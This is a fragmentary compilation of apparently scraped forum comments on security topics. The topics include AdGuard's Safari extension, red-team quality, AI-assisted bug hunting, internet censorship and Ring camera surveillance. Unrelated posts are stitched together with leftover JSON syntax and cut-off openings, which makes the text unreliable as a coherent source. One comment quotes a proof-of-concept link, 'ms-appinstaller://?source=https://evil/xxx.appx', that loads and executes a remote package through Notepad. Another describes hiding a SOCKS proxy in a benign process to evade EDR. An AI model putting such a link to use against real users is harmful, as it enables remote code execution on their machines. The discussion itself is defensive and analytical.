Currently we manually sync branch “version/v4.5” while the big rework in “main” is still in development and will only be synced when it’s released.\n2. v4.5 only receives cosmetic changes and supporting libraries updates (which are pretty substantial though). The libraries that implement the actual app logic are SafariConverterLib, DnsLibs, AdguardAssistant. They are all also open source, available on Github, and used by many other ad blockers.\n\n>I learned that the way they fix up ads is by executing 20,000+ lines of javascript on EVERY SINGLE WEBSITE you load\n\nI wouldn’t agree with the exact number of lines, but yes, modern ad blocking requires executing a lot of JavaScript.\n\n>I kept digging and learned that Adguard is registered in Cyprus but all the developers live in Moscow.\n\nThat’s simply not true. After 2022 a large part of the team was relocated and nowadays, most of the team does not live there, especially key personnel.   \nThat said, there is no “ban” on ru. Moreover, since this is open source, we will be happy to have contributions from anywhere, be it Russia, US, China, etc.\n\n",

The “remote updates every 6 hours” he mentions are just filter lists and cosmetic rules being updated, which is standard for every major content blocker. It’s not executable code being swapped in secretly.\n\nSo technically, there’s nothing surprising or risky here. The post is really just focused on the fact that AdGuard has developers in Russia, which they’ve never tried to hide, and then spins that into a kind of “could be dangerous” story without any evidence.",

          "text": "The 20K lines of injected code is concerning but it's worth understanding the mechanics here. iOS content blockers (the 'good' kind) use the Content Blocker extension API which works declaratively — you give Safari a JSON list of rules, and Safari does the blocking itself. The extension never sees your traffic.\n\nBut Safari Web Extensions (which AdGuard also uses for its advanced features) get much deeper access. They can inject arbitrary JavaScript into every page you visit via content scripts. That's where the 20K lines comes in — it's not just filtering rules, it's active code running in your browser context.\n\nThe real risk vector is that this injected JS has access to the DOM of every page you visit. In theory it could read form inputs, modify page content, or exfiltrate data. Whether it does or doesn't today, you're essentially trusting a third party with the same level of access that a malicious browser extension would have.\n\nIf you want to audit what's actually happening, you can:\n1. Enable Safari Web Inspector (Settings > Safari > Advanced)\n2. Connect to your Mac and inspect Safari on the device\n3. Look at the injected content scripts under the Sources tab\n4. Monitor network requests coming from the extension context\n\nThe broader issue is that the App Store review process for Safari extensions doesn't deeply audit injected JavaScript. Apple reviews the extension manifest and basic behavior, but the actual JS code running in your browser gets minimal scrutiny compared to native app code.",

Instead, it makes use of ordinary WiFi devices already communicating with each other nearby. As radio waves move through a space and interact with people, they create distinctive patterns that can be captured and analyzed. These patterns are comparable to images produced by cameras, but they are formed using radio signals rather than light. The research team argues that this emerging capability highlights the urgent need for stronger privacy protections.",

So… we’re polishing the same turd, just with a bigger GPU.\n\nWhat I *have not* heard\n\n“Here’s how we get in front of adversaries and make them bleed time/money.”\n\n“Here’s a new defense-in-depth model where hunting is built-in, not a vibes-based afterthought.”\n\n“Here’s how we make attackers’ iteration loop slower than ours.”\n\nInstead it’s: make your silo shinier. Make your dashboard calmer. Make your weekly metrics prettier. (make me look better!)\n\nAnd if you’ve ever been hired to “combat threat actors across the whole company,” you know the brick wall - we all hit it head first\n\nSo the org keeps doing what it can measure today: more triage, better filtering, fancier scoring.\n\nAI could actually break the wall. But breaking walls doesn’t sell as clean as “30% less noise.”\n\nAm I wrong? You know what? F it. I know I'm not wrong.  \nIt's all turd polishing",

Our bosses only understand AI in the context of chatbots, which are really just tools for swaying people and marketing.

It's always dogshit. It's usually not accurate, but like every 10th prompt or so it gives me a paragraph or two that's fairly solid that I leverage... but reallistically what did it help me do? Very little. Could I have come up with the content I DO use from it? Absolutely. In most instances, I've just wasted time trying to get it to output what I want instead of just actually DOING the work.

You're expecting AI to come and make your job easier or to deliver on some expectation but its just a tool or a new methodology that opens up new avenues and capabilities. It's up to you to use it to accomplish those goals. Also, a lot of what you're talking about is well outside the realms of network defense or security operations. Most places don't counter-hack and the places that do don't jump on Reddit and talk about it.\n\nThe LIMFACs that stand in the way are: the organizations appetite to adopt new capabilities and allow new strategies, the capability being possible/feasible/reasonable to accomplish a goal, and the individuals ability to obtain the skillset. You have control over at least one of those, so there's no sense blaming \"AI\". \n\nIf you want to actually determine _if_ and _how_ DS/ML can help within the cyber domain, grab some books, load up a notebook, and get after it. If you can't use it at work (one of those LIMFACs I mentioned), do it at home. There are tons of free and available cybersecurity datasets and no end of white papers, blogs, articles, and books on how ML is used to provide insights from them.\n\nI'm a threat hunter who specializes in applied ML specifically for hunting. I've got a growing list of ways I've used modeling, predictive analysis, time series forecasting, and even deep learning to get after \"the bad\", so it is possible and it is being done.",

Hell, they have staff who've leaked logs before.\n\nChina has been selling its GFW technology for quite a while now and going through brokers in the EU to do it. I'm sure we'll see it soon enough in Europe. Personally, I'm hoping for hand-rolled solutions (as the best case worst case scenario) because I don't think my government (UK) in its present state is capable of creating anything as difficult to work around as the GFW (which had a huge headstart, co-evolved with the web, and has decades of iterative upgrades and real-world pen testing).\n\nI do find it tragicomic that people saw - and largely still see - internet censorship as \"that thing that happens in China and third-world dictatorships\" without recognising that the West (esp. Europe) has been creeping in that direction for 15 years now and rapidly accelerating. Now that people can't access sites as innocuous, even vacuous, as Imgur in the UK, they're starting to wake up to it. I find myself saying, \"Yes, that's the OSA you were so excited about and never read. Thanks.\"\n\nBTW, where's the source on Musk/X performing that function in the US? In much of Europe, it often seems to many people like he's providing the mainstream bulwark against the OSA/DSA/etc. Personally, I'm wishing Wyoming the best with its plan to become the anti-OSA state. The law's drafters say that it'll free the net for the entire world due to their resistance to pressure from all other nation states, though it remains to be seen if they can do that. If it's more than mere bluster, it could be exciting for everyone.",

Either way, it's not something that engenders trust in the platform.\n\nThis brings into question other claims that Discord makes about their data handling. They claim they don't sell your data, but they could easily be providing it to companies or governments anyway.

      "text": "Throwaway account for obvious reasons.\n\nTLDR: we've had a lot of red teams performed against our org by third parties. Those performed by well-known US consultancies have been extremely poor quality. In contrast, we have recently finished up our first RT provided by a UK firm and the difference in quality was a chasm. Why is this the case and has anyone else noticed this.  \n\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\\_\n\nA quick bit about me: I'm a SOC manager at a large US financial, I have over a decade of experience in defense and have seen all sorts of interesting incidents. These days my role is all about skilling up our next generation of analysts, for which I heavily rely on Red Team engagements (adversary simulations, not pentests).\n\nTo get to the point, over the last 5 years we have had yearly Red Team engagements performed against us. I won't name names of who we've used (and I'm not part of the procurement process - for now....) but they have all been performed by well-known consultancies based in the US, with the exception of the most recent assessment which was a UK firm. We cycle through vendors so each assessment has been performed by different companies.\n\nEvery single one of the US Red Teams have failed miserably. I'd consider us a mature environment, we have to be, but I'm not naive enough to think we are inpenetrable. Having said that, I honestly don't understand how people are recommended these companies and constantly hyping them up as \"hardcore Red Teamers\". Some highlights over the years:\n\nFor example, on last years assessment they tried phishing users by sending a mass email campaign without any setup or social engineering. Just an email to 50 users with a link. Immediately got caught by our ESG. They then immediately went to assumed breach by requesting a laptop and vpn. They then did the entire assessment from the laptop without even attempting to get an implant running on it (and got caught the moment they tried to RDP to a host they shouldn't have). \n\nMost of the US teams we have used don't even bother with phishing, they almost always go straight to assumed breach, and regularly request exceptions made for their implants. It's so low effort I don't understand the point. All of them use completely out-dated techniques, which on its own isn't a bad thing, but they don't even try and adapt them to bypass signature based detections - like the team the year before who got caught using impacket without any alterations.\n\nIn contrast, the UK team we used (who I think are quite well known in those parts but maybe less so over here) were on a completely different level. They got in through a phishing campaign they had built up over 3 weeks of social engineering. Once inside they barely made any noise and reading the report it feels like every single tool they used was either completely custom or heavily adapted. We did detect them twice, but they had executed their techniques and built their payloads in such a way that they blended in with the environment and as a result both detections got marked FP. The whole engagement was eye opening, especially for our board who had a false sense of security from previous assessments.\n\nI'm not sure why I'm making this post. It might be out of frustration more than anything. I have seen post after post about how amazing X is, or how Y's team are the gold standard, and yet we have seen RTs done by all of these companies and to me they seem completely overhyped. Has anyone else had similar experiences? Does any from the UK (and maybe EU) understand why there is such a difference?\n\nFinal note: please don't ask about specific companies, you can guess all you want I won't answer. ",

If you've ever been on a Red team and have real talent, it doesn't take long for your soul to be sucked away when you put in real effort to find some seriously awesome flaws and they try to talk them down or get them removed entirely for 'optics'.\n\nThe real issue is why hire good people for higher pay when you have customers like that? Are there good companies there? Yes, but if you want to hire them a lot of management/compliance teams wants a big name who hires people with zero talent because the big name looks better for auditors.",

There are some very serious, centrally regulated industries (UK) where CBEST & GBEST engagements are the norm (think red team on an insane cocktail of uppers and steroids, lasting 120+days…with no sleep). These engagements are ‘as close to the real thing’ as you can get without looking at continuous red teaming which is very expensive. Exposure to that/those greatly assists with the maturity of Red Teams and how they will approach the scenario. \n\nI would guess that the cost of the RT from a US supplier was lower than the UK one (once you’ve converted to a common currency). Would cost have been a factor in the previous decision making process?\n\nFrom the conversations we have as a sales team with our US & APAC sales colleagues, the US is quite immature by comparison (not having a pop at you or yours) and the lack of centralisation for standards won’t help that mature quickly. \n\nHow are CREST doing on their global march?",

For one of our last engagements we didn’t need a full blown beacon, we only required a Socks proxy, which we then injected and persisted through a beign process. \n\nFinally, having beacons white listed is a debate among the red team community. Some teams (like ours) spend a lot of time in R&D to bypass EDR. However, imagine if this time was instead spent looking for problems in our corporate environment. It may some reduce the companies risk in the long run. But I personally like the EDR evasion research, and would probably lose out on technical skills gained by bypassing EDRs if I were to focus purely on company specific vulns.",

They still struggled with being successful but they did eventually get into a server (via PW guessing against user passwords). They tripped my alarms over 500 times and we were never allowed to contain or eradicate them.\n\nPersonally, I don’t consider what they did to be a true pen test. It’s not white box (full vulnerability and config insight) nor black box (no insights). I personally consider this type of engagement to be more of a vulnerability test / confirmation than a pen test. I think management assumes this approach saves money and if it satisfies auditors then I think that’s all they care about.\n\nImagine assuming breach, giving pen testers a foothold, and then being surprised they got in; well no shit they got in, you let them in. The only thing worse would be giving them an internal foothold and then having them fail to successfully “get in”. Never used a UK or EU firm but it sounds like they’re doing it right.",

Not what's occurring here, from just knowing how notepad works... It doesn't listen on the network...\n\nIf the PoC we've seen:\n```\n[poc](ms-appinstaller://?source=https://evil/xxx.appx)\n```\nis what Msft patched, this is a 2-3 click (one for opening the md file, a Ctrl+click to execute the link, and an accept on a security warning).\n\nIt matches Msft's description outlined in their CVE issuance found here: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-20841\n\nOr it's a vulnerability in the markdown parser, which no one has released yet, which would be much cooler and more technically impressive than the above.\n\nEdit: Notes from the FAQ for those interested:\n```\nHow could an attacker exploit this vulnerability?\n\nAn attacker could trick a user into clicking a malicious link inside a Markdown file opened in Notepad, causing the application to launch unverified protocols that load and execute remote files.\n\nAccording to the CVSS metric, the attack vector is network (AV:N) and user interaction is required (UI:R). What is the target context of the remote code execution?\n\nThe malicious code would execute in the security context of the user who opened the Markdown file, giving the attacker the same permissions as that user.\n```",

I can't really talk about the specifics of what I'm working on because of NDAs, but they will be lifted shortly I'll post our experiences to ostif.org.\n\nGenerally, and this speaking on eight different products that all have the same goals (findings bugs in open source software, and generating fixes automagically), these tools need a LOT of human assistance by a senior researcher to be effective, as their findings are inconsistent and it takes human triage time to sift through the issues. There is a 0% chance that a new version of Opus fundamentally changes that. It may improve or even dramatically improve the rates of meaningful findings, but you still have to comb through every single candidate result and verify that it's actually a security problem.\n\nThere's a lot of reasons for this, but namely, LLMs don't understand threat models well and they also don't have a grasp on complex topics like exploit-ability.\n\nI can give you a real world example from some of my own personal research that isn't under NDA. Claude 4.5 consistently calls out anything that wraps malloc as exploitable because it can overflow. You tell it that the function only handles trusted data inputs directly from malloc, and it will call it out again even when you tell it not to. The problem is that in the hands of someone who doesn't understand what they're looking at, they're going to report the 500,000+ times this happens in open source to every maintainer. You need a human sanity check to stop this from happening.\n\nPre-triage efforts using LLMs to sift through the output of the other LLM is a multi-faceted problem as well, because it will also make errors and let through some false positives still, but also it will take out genuine bugs and has a deterministic rate of false negatives as well. Not to mention that every time you add another layer of agents, and using Opus, you're talking a lot of tokens/electricity/cash burned for a solution that's still largely unusable.",

That's nice, how many agents were you running in parallel? I'm guessing they spent millions in tokens.\n\n\\-They specifically mention using \"human experts\" to review every bug before reporting them. Again they don't disclose the size of the team required to do this, nor the number of findings that were false positives. THIS is the key limitation to these tools right now. In open source no one has the resources to do this sifting. Claude also generated patches and they were also reviewed by engineers. Again, this is crucial to understand.\n\n  \n\\-They also call out Claude as not using SAST or fuzzing and simply using out of the box analysis. The error rates for this would be insanely high. They likely spent thousands of engineer-hours to review this all.\n\n\\-They also imply that the projects tested has SAST and fuzzing \"running for years\" which is kind of irrelevant. The strategy of any security research team is to look where the existing tools can't reach. You look to expand fuzzing coverage, add SAST rules that are relevant, and do manual analysis for logic bugs. It doesn't make sense to check for the same types of bugs that testing would have already found.\n\n\\-They then play the narrative of putting more tools in the hands of defenders. That's good and all. Actually it's fantastic that they spend enormous resources to do find and fix these bugs. It's great for open source and literally all of us. However, the entire post is based on this series of half-truths about how this was achieved, and it's written to get people and companies convinced that Claude is now a security research tool with zero drawbacks.\n\nAgain, it's great that Anthropic did this for open source. I'm also confident that these tools will continue to improve over time, and we may reach the summit someday where minimal human intervention is needed. But Anthropic burning millions of dollars worth of tokens and thousands of hours of engineer research time to achieve this doesn't give the message that they want. They had to tilt it like this and it leaves a bad taste in my mouth.\n\nAlso, it's not just Anthropic doing this. See Zeropath, Aisle, and others doing the exact same thing, and not mentioning the false positive rates, the engineering costs of triage, and so on.",

That'll likely be one of the next patterns we tackle.\n\nOn AI/ML supply chain -- SP-027 covers AI integration at the architecture level but you're right that model provenance, training data integrity, and drift detection deserve their own dedicated pattern. The supply chain angle is different enough from the integration angle that it probably warrants a standalone pattern rather than trying to cram it into SP-027.\n\nFor suggesting patterns, GitHub issues on osa-data works well (github.com/opensecurityarchitecture/osa-data).

And the underlying pattern data is all structured JSON on GitHub (CC BY-SA) so you could build your own internal scoring against it.\n\nOffline spreadsheet templates and an API for programmatic access are both on the near-term roadmap.

Hopefully your company has good documentation, if they already have established SOC playbooks, SOPs, etc, start by reviewing those. You should at least know which playbook to execute when. Build the bigger picture from there with your team's Security Incident Response plan, and then your company's overall Incident Response plan.\n\nYour manager probably has specific skills that he will want you to develop, maybe even a whole training plan already created. If he leaves it open to you, there's really two paths you can choose. Hands-on virtual labs like Let's Defend or THM/HTB SOC learning paths. Or traditional certifications that might be a mix of labs and lecture like CySA+, BTL1, or SC-200 (if you are a Microsoft shop).",

      "text": "Ring just rolled out a new AI feature called “Search Party” that helps people find lost dogs by scanning footage from nearby Ring cameras. When someone posts a missing-pet alert in the Neighbors app, the system looks for animals in recent clips from participating outdoor cameras. If there’s a possible match, the camera owner gets notified and can decide whether to share the video. Nothing is “automatically” sent to the person searching.\n\nRight now, the official use case is pets, and Ring says sharing is always optional. But the part that makes some people uneasy is the scale: a network of neighborhood cameras, combined with AI that can search across large areas. Some users have also said the feature was enabled by default, which raises questions about consent and awareness, even if you can turn it off.\n\nThat leads to the bigger discussion: if the tech can scan for dogs, it could theoretically be adapted to look for stolen property, missing people, or other targets in the future. That doesn’t mean it is being used that way today, but once the infrastructure exists, pressure to expand it usually follows especially from governments or law enforcement agencies looking for new tools.\n\nSo this isn’t proof of some secret program to track people, and there’s no indication that agencies like ICE are using this feature right now. But it is an example of how systems built for friendly, community uses can evolve into much more powerful surveillance tools over time. The real questions are about defaults, transparency, opt-in vs. opt-out, and what limits get set before those expansions ever happen.\n\nI feel like their Super Bowl ad was basically an advertisement to major organizations to get ideas they could work with RING on, and it’s not finding dogs.. lol\n\nEdit: have been in lunch demos of “think tanks” in DC who pitch to agencies and who else comes for the food. That commercial on the Super Bowl just stood out significantly because it was not for a consumer product. They call this a “proof point”\n\nAnyways just a warning to journalist and the public",
